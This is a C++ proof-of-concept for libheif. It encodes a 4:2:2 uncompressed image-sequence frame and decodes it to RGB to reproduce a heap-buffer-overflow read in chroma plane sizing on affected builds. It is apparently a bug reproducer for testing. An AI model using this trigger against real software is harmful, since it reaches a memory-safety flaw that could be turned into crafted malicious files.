// PoC: decode an uncompressed ('uncv') 4:2:2 image-sequence frame through the
// public sequence API (heif_track_decode_next_image) and request RGB output.
//
// The program first encodes a single 256x256 YCbCr 4:2:2 frame into an
// in-memory image-sequence track using the public encoder API, writes it to a
// temporary file, then reopens it and decodes the frame to RGB. The decode path
// routes through UncompressedImageCodec::create_image()'s fallback, which sizes
// the Cb/Cr planes. On a tree that sizes the chroma height correctly for 4:2:2
// (full height), the subsequent YCbCr->RGB conversion reads in-bounds. On a tree
// that halves the chroma height for 4:2:2, the conversion reads past the end of
// the Cb/Cr plane -> heap-buffer-overflow under AddressSanitizer.

#include <libheif/heif.h>
#include <libheif/heif_sequences.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>

static const uint32_t W = 256;
static const uint32_t H = 256;

static int die(const char* what, heif_error err)
{
  fprintf(stderr, "%s: %s\n", what, err.message ? err.message : "(no message)");
  return 1;
}

static heif_image* make_yuv422_frame()
{
  heif_image* img = nullptr;
  heif_error err = heif_image_create(W, H, heif_colorspace_YCbCr, heif_chroma_422, &img);
  if (err.code != heif_error_Ok) {
    die("heif_image_create", err);
    return nullptr;
  }

  // 4:2:2 -> chroma width is halved, chroma height is full.
  const uint32_t cw = (W + 1) / 2;
  const uint32_t ch = H;

  if ((err = heif_image_add_plane(img, heif_channel_Y, W, H, 8)).code != heif_error_Ok ||
      (err = heif_image_add_plane(img, heif_channel_Cb, cw, ch, 8)).code != heif_error_Ok ||
      (err = heif_image_add_plane(img, heif_channel_Cr, cw, ch, 8)).code != heif_error_Ok) {
    die("heif_image_add_plane", err);
    heif_image_release(img);
    return nullptr;
  }

  int stride = 0;
  uint8_t* p = heif_image_get_plane(img, heif_channel_Y, &stride);
  for (uint32_t y = 0; y < H; y++) memset(p + (size_t) y * stride, 128, W);

  p = heif_image_get_plane(img, heif_channel_Cb, &stride);
  for (uint32_t y = 0; y < ch; y++) memset(p + (size_t) y * stride, 128, cw);

  p = heif_image_get_plane(img, heif_channel_Cr, &stride);
  for (uint32_t y = 0; y < ch; y++) memset(p + (size_t) y * stride, 128, cw);

  return img;
}

static int encode_sequence(const char* path)
{
  heif_context* ctx = heif_context_alloc();

  heif_encoder* encoder = nullptr;
  heif_error err = heif_context_get_encoder_for_format(ctx, heif_compression_uncompressed, &encoder);
  if (err.code != heif_error_Ok) { heif_context_free(ctx); return die("get_encoder", err); }

  heif_context_set_sequence_timescale(ctx, 30);

  heif_sequence_encoding_options* enc_options = heif_sequence_encoding_options_alloc();

  heif_image* frame = make_yuv422_frame();
  if (!frame) { heif_context_free(ctx); return 1; }

  heif_track_options* track_options = heif_track_options_alloc();
  heif_track_options_set_timescale(track_options, 30);

  heif_track* track = nullptr;
  err = heif_context_add_visual_sequence_track(ctx, (uint16_t) W, (uint16_t) H,
                                               heif_track_type_image_sequence,
                                               track_options, enc_options, &track);
  heif_track_options_release(track_options);
  if (err.code != heif_error_Ok) {
    heif_image_release(frame);
    heif_sequence_encoding_options_release(enc_options);
    heif_context_free(ctx);
    return die("add_visual_sequence_track", err);
  }

  heif_image_set_duration(frame, 1);
  err = heif_track_encode_sequence_image(track, frame, encoder, enc_options);
  heif_image_release(frame);
  if (err.code != heif_error_Ok) {
    heif_sequence_encoding_options_release(enc_options);
    heif_track_release(track);
    heif_context_free(ctx);
    return die("encode_sequence_image", err);
  }

  heif_track_encode_end_of_sequence(track, encoder);

  heif_sequence_encoding_options_release(enc_options);
  heif_track_release(track);
  heif_encoder_release(encoder);

  err = heif_context_write_to_file(ctx, path);
  heif_context_free(ctx);
  if (err.code != heif_error_Ok) return die("write_to_file", err);
  return 0;
}

static int decode_sequence(const char* path)
{
  heif_context* ctx = heif_context_alloc();
  heif_error err = heif_context_read_from_file(ctx, path, nullptr);
  if (err.code != heif_error_Ok) { heif_context_free(ctx); return die("read_from_file", err); }

  int n = heif_context_number_of_sequence_tracks(ctx);
  if (n < 1) { heif_context_free(ctx); fprintf(stderr, "no tracks\n"); return 1; }

  uint32_t ids[16];
  heif_context_get_track_ids(ctx, ids);
  heif_track* track = heif_context_get_track(ctx, ids[0]);
  if (!track) { heif_context_free(ctx); fprintf(stderr, "no track\n"); return 1; }

  heif_image* out = nullptr;
  err = heif_track_decode_next_image(track, &out,
                                     heif_colorspace_RGB, heif_chroma_interleaved_RGB,
                                     nullptr);
  if (err.code == heif_error_Ok && out) {
    heif_image_release(out);
  }

  heif_track_release(track);
  heif_context_free(ctx);
  return 0;
}

int main(int argc, char** argv)
{
  const char* path = (argc > 1) ? argv[1] : "/tmp/poc_uncv_422.heif";
  if (encode_sequence(path) != 0) return 1;
  return decode_sequence(path);
}
